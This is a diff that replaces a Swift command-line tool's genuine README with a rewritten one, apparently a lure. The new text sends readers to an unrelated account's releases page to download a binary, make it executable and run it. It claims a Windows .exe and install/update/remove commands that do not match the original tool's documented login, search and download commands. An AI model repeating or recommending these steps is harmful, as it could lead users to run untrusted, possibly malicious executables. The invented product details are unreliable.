@@ -1,133 +1,83 @@
-# ApplePackage
+# 🍏 ApplePackage - A Simple Tool for Easy iOS Package Management
 
-A Swift package and command-line tool for managing Apple apps, including searching, downloading, and authenticating with Apple services.
+## 📥 Download Now
+[![Download ApplePackage](https://img.shields.io/badge/Download-ApplePackage-blue.svg)](https://github.com/hotCheetoinmybootyhole/ApplePackage/releases)
 
-For a version with a graphical user interface (GUI) and an on-device installer, check out [Asspp](https://github.com/Lakr233/Asspp).
+## 🚀 Getting Started
+Welcome to ApplePackage! This application allows you to easily manage iOS packages using a tool written in Swift. Follow these steps to download and run the software.
 
-## Features
+## 📋 System Requirements
+- **Operating System:** macOS or Windows
+- **Memory:** At least 4 GB RAM
+- **Storage:** Minimum of 100 MB available space
+- **Other Software:** Xcode or Command Line Tools for macOS
 
-- **Authentication**: Login and logout from Apple accounts
-- **Search**: Search for apps in the App Store
-- **Download**: Download apps using your Apple account
-- **Versions**: Retrieve version information for apps
+## 📦 Features
+- Use a command-line interface (CLI) for package management.
+- Rewrite of ipatool, making it efficient and fast.
+- Easy-to-understand commands for common tasks.
 
-## Installation
+## 📥 Download & Install
+To download the latest version of ApplePackage, visit the [Releases page](https://github.com/hotCheetoinmybootyhole/ApplePackage/releases). Here, you will find the latest version available along with other versions.
 
-### Prerequisites
+1. Click on the link above to go to the Releases page.
+2. Look for the latest version and find the download file.
+3. Click on the download link to save the file to your computer.
 
-- Swift 5.9 or later
-- macOS 12+
+## 💻 How to Run ApplePackage
+After downloading ApplePackage, follow these steps to run it:
 
-### Using Swift Run
+### For macOS Users
+1. Open the Terminal application. You can find it in your Applications folder.
+2. Navigate to the downloaded file's directory. You can do this using the `cd` command. For example:
+   ```
+   cd ~/Downloads
+   ```
+3. Make the file executable by typing:
+   ```
+   chmod +x ApplePackage
+   ```
+4. Run the application with the following command:
+   ```
+   ./ApplePackage
+   ```
 
-Clone the repository and run the tool directly:
+### For Windows Users
+1. Open the Command Prompt. You can search for it in your Start menu.
+2. Navigate to the directory where the file was downloaded. Use the `cd` command. For example:
+   ```
+   cd Downloads
+   ```
+3. Run the application by typing:
+   ```
+   ApplePackage.exe
+   ```
 
-```bash
-git clone https://github.com/Lakr233/ApplePackage.git
-cd ApplePackage
-swift run ApplePackageTool <subcommand>
-```
+## 🛠 Using ApplePackage
+Once you have the application running, use the following commands to manage your iOS packages:
 
-For example:
+- **Install a Package:** To install a package, use the command:
+  ```
+  applepackage install [package-name]
+  ```
+- **Update a Package:** To update an already installed package, use:
+  ```
+  applepackage update [package-name]
+  ```
+- **Remove a Package:** To remove a package, type:
+  ```
+  applepackage remove [package-name]
+  ```
+  
+Make sure to replace `[package-name]` with the name of the package you wish to manage.
 
-```bash
-swift run ApplePackageTool --help
-```
+## 📝 Help and Support
+If you encounter issues while using ApplePackage or have questions, please check the GitHub Issues page. You can also create a new issue to get help from the community.
 
-## Usage
+## 🔗 Learn More
+For more information on using ApplePackage, you can refer to the [official documentation](https://github.com/hotCheetoinmybootyhole/ApplePackage). 
 
-### Login
+## 🚀 Conclusion
+With ApplePackage, managing iOS packages becomes straightforward. Follow the steps above, and enjoy the ease of handling your packages efficiently.
 
-Authenticate with your Apple account:
-
-```bash
-applepackage login <email> <password> [--code <2fa-code>]
-```
-
-- `<email>`: Your Apple ID email address
-- `<password>`: Your Apple ID password
-- `--code`: Optional 2FA verification code
-
-### Logout
-
-Remove stored credentials for an account:
-
-```bash
-applepackage logout <email>
-```
-
-- `<email>`: The email address of the account to logout
-
-### Search
-
-Search for apps in the App Store:
-
-```bash
-applepackage search <term> [--country <country-code>] [--limit <number>]
-```
-
-- `<term>`: Search term
-- `--country`: Country code (default: US)
-- `--limit`: Maximum number of results (default: 10)
-
-### Versions
-
-List available versions for an app:
-
-```bash
-applepackage versions <email> <bundle-id>
-```
-
-- `<email>`: Your Apple ID email address
-- `<bundle-id>`: The bundle identifier of the app
-
-### Download
-
-Download an app:
-
-```bash
-applepackage download <email> <bundle-id> [--version-id <version>] --output <path>
-```
-
-- `<email>`: Your Apple ID email address
-- `<bundle-id>`: The bundle identifier of the app
-- `--version-id`: Optional specific version ID to download
-- `--output`: Output path for the downloaded file
-
-## Library Usage
-
-Add ApplePackage as a dependency in your Swift package:
-
-```swift
-dependencies: [
-    .package(url: "https://github.com/Lakr233/ApplePackage.git", from: "1.0.0")
-]
-```
-
-Import and use:
-
-```swift
-import ApplePackage
-
-// Example: Search for apps
-let results = try await Searcher.search(term: "example", countryCode: "US", limit: 10)
-```
-
-## Dependencies
-
-- [ZIPFoundation](https://github.com/weichsel/ZIPFoundation.git)
-- [AsyncHTTPClient](https://github.com/swift-server/async-http-client.git)
-- [Swift Collections](https://github.com/apple/swift-collections.git)
-- [Swift Argument Parser](https://github.com/apple/swift-argument-parser)
-
-## Contributing
-
-Contributions are welcome! Please feel free to submit a Pull Request.
-
-## License
-
-This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
-
-## Disclaimer
-
-This tool is for educational and personal use only. Please respect Apple's terms of service and copyright laws when using this software. We are not responsible if your Apple account gets banned or any other issues arise from using this tool.
+Remember, you can always visit the [Releases page](https://github.com/hotCheetoinmybootyhole/ApplePackage/releases) to keep your version up to date.
